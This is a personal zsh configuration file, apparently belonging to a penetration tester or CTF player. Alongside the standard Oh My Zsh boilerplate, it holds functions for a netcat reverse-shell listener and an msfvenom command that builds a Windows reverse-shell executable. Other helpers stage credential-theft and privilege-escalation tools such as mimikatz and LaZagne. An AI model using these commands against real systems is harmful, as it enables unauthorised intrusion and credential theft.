# If you come from bash you might have to change your $PATH.
# export PATH=$HOME/bin:$HOME/.local/bin:/usr/local/bin:$PATH

# Path to your Oh My Zsh installation.
export ZSH="$HOME/.oh-my-zsh"

# Set name of the theme to load --- if set to "random", it will
# load a random theme each time Oh My Zsh is loaded, in which case,
# to know which specific one was loaded, run: echo $RANDOM_THEME
# See https://github.com/ohmyzsh/ohmyzsh/wiki/Themes
ZSH_THEME="robbyrussell"

# Set list of themes to pick from when loading at random
# Setting this variable when ZSH_THEME=random will cause zsh to load
# a theme from this variable instead of looking in $ZSH/themes/
# If set to an empty array, this variable will have no effect.
# ZSH_THEME_RANDOM_CANDIDATES=( "robbyrussell" "agnoster" )

# Uncomment the following line to use case-sensitive completion.
# CASE_SENSITIVE="true"

# Uncomment the following line to use hyphen-insensitive completion.
# Case-sensitive completion must be off. _ and - will be interchangeable.
# HYPHEN_INSENSITIVE="true"

# Uncomment one of the following lines to change the auto-update behavior
# zstyle ':omz:update' mode disabled  # disable automatic updates
# zstyle ':omz:update' mode auto      # update automatically without asking
# zstyle ':omz:update' mode reminder  # just remind me to update when it's time

# Uncomment the following line to change how often to auto-update (in days).
# zstyle ':omz:update' frequency 13

# Uncomment the following line if pasting URLs and other text is messed up.
# DISABLE_MAGIC_FUNCTIONS="true"

# Uncomment the following line to disable colors in ls.
# DISABLE_LS_COLORS="true"

# Uncomment the following line to disable auto-setting terminal title.
# DISABLE_AUTO_TITLE="true"

# Uncomment the following line to enable command auto-correction.
# ENABLE_CORRECTION="true"

# Uncomment the following line to display red dots whilst waiting for completion.
# You can also set it to another string to have that shown instead of the default red dots.
# e.g. COMPLETION_WAITING_DOTS="%F{yellow}waiting...%f"
# Caution: this setting can cause issues with multiline prompts in zsh < 5.7.1 (see #5765)
# COMPLETION_WAITING_DOTS="true"

# Uncomment the following line if you want to disable marking untracked files
# under VCS as dirty. This makes repository status check for large repositories
# much, much faster.
# DISABLE_UNTRACKED_FILES_DIRTY="true"

# Uncomment the following line if you want to change the command execution time
# stamp shown in the history command output.
# You can set one of the optional three formats:
# "mm/dd/yyyy"|"dd.mm.yyyy"|"yyyy-mm-dd"
# or set a custom format using the strftime function format specifications,
# see 'man strftime' for details.
# HIST_STAMPS="mm/dd/yyyy"

# Would you like to use another custom folder than $ZSH/custom?
# ZSH_CUSTOM=/path/to/new-custom-folder

# Which plugins would you like to load?
# Standard plugins can be found in $ZSH/plugins/
# Custom plugins may be added to $ZSH_CUSTOM/plugins/
# Example format: plugins=(rails git textmate ruby lighthouse)
# Add wisely, as too many plugins slow down shell startup.
plugins=(git)

source $ZSH/oh-my-zsh.sh

# User configuration

# export MANPATH="/usr/local/man:$MANPATH"

# You may need to manually set your language environment
# export LANG=en_US.UTF-8

# Preferred editor for local and remote sessions
# if [[ -n $SSH_CONNECTION ]]; then
#   export EDITOR='vim'
# else
#   export EDITOR='nvim'
# fi

# Compilation flags
# export ARCHFLAGS="-arch $(uname -m)"

# Set personal aliases, overriding those provided by Oh My Zsh libs,
# plugins, and themes. Aliases can be placed here, though Oh My Zsh
# users are encouraged to define aliases within a top-level file in
# the $ZSH_CUSTOM folder, with .zsh extension. Examples:
# - $ZSH_CUSTOM/aliases.zsh
# - $ZSH_CUSTOM/macos.zsh
# For a full list of active aliases, run `alias`.
#
# Example aliases
# alias zshconfig="mate ~/.zshrc"
# alias ohmyzsh="mate ~/.oh-my-zsh"

## Functions

### BloodHound Community Edition
bhce() {
    local file="~/Tools/BloodHoundCE/docker-compose.yml"

    if [[ $1 == "up" ]]; then
        docker-compose -f "$file" up
    elif [[ $1 == "down" ]]; then
        docker-compose -f "$file" down
    else
        echo "Usage: bhce {up|down}"
        return 1
    fi
}

### Python3 HTTP Server
serve() {
    python3 -m http.server 8888
}

### Netcat Reverse Shell
rev() {
    PORT=$1
    echo '# python -c "import pty; pty.spawn("/bin/bash")"'
    echo '# python3 -c "import pty; pty.spawn("/bin/bash")'
    rlwrap -cAr nc -nvlp "$PORT"
}

### Get Fullpath of File
get() {
    file=$1
    echo "Location of the file copied to clipboard"
    realpath "$file" | xclip -select clipboard
}

### Make Default Directories
mkdef() {
    mkdir -p scans exploits tools
}


lnlt() {
    ln -s /usr/share/peass-ng/linpeas.sh "$(pwd)/tools/"
    ln -s /usr/share/pspy/pspy64 "$(pwd)/tools/"
    ln -s ~/Tools/LaZagne/Linux/laZagne.py "$(pwd)/tools/"
}

lnwt() {
    ln -s /usr/share/peass-ng/winPEAS.bat "$(pwd)/tools/"
    ln -s /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 "$(pwd)/tools/"
    ln -s /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 "$(pwd)/tools/"
    ln -s /usr/share/windows-resources/binaries/nc.exe "$(pwd)/tools/"
    ln -s /usr/share/windows-resources/binaries/nc64.exe "$(pwd)/tools/"
    ln -s ~/Tools/BloodHoundCE/SharpHound.exe "$(pwd)/tools/"
    ln -s ~/Tools/LaZagne/LaZagne.exe "$(pwd)/tools/"
    ln -s ~/Tools/PSUpload.ps1 "$(pwd)/tools/"
    ln -s ~/Tools/Invoke-TheHash/Invoke-TheHash.psd1 "$(pwd)/tools/"
    ln -s /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe "$(pwd)/tools/" 
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f exe -o "$(pwd)/tools/rev.exe" > /dev/null 2>&1
}

lnpv() {
    ln -s /usr/share/ligolo-ng/linux/proxy "$(pwd)/tools/ligolo-proxy"
    ln -s /usr/share/ligolo-ng/linux/agent "$(pwd)/tools/ligolo-agent"
    ln -s /usr/share/ligolo-ng/windows/proxy.exe "$(pwd)/tools/ligolo-proxy.exe"
    ln -s /usr/share/ligolo-ng/windows/agent.exe "$(pwd)/tools/ligolo-agent.exe"
}

## Aliases

alias bat="batcat"
alias ls="ls -N --color=auto"
alias mkdir="mkdir -p"
alias x="xclip -selection clipboard"

alias downloads="cd ~/Downloads"
alias documents="cd ~/Documents"

alias ctf="cd ~/Documents/ctf"
alias thm="cd ~/Documents/ctf/TryHackMe"
alias htb="cd ~/Documents/ctf/HackTheBox"

export PYENV_ROOT="$HOME/.pyenv"
[[ -d $PYENV_ROOT/bin ]] && export PATH="$PYENV_ROOT/bin:$PATH"
eval "$(pyenv init -)"

alias rustscan="docker run -it --rm --name rustscan rustscan/rustscan:2.1.1"
alias dive="docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock wagoodman/dive:latest"
alias ssrfmap="docker run -it -v ~/Tools/SSRFmap:/usr/src/app ssrfmap ssrfmap.py"
alias binwalk="docker run --rm -it -v .:/anaylsis binwalkv3"
alias legba="docker run -v $(pwd):/data --network host -it --rm evilsocket/legba:latest"
alias sherlock="docker run -it --rm sherlock/sherlock"
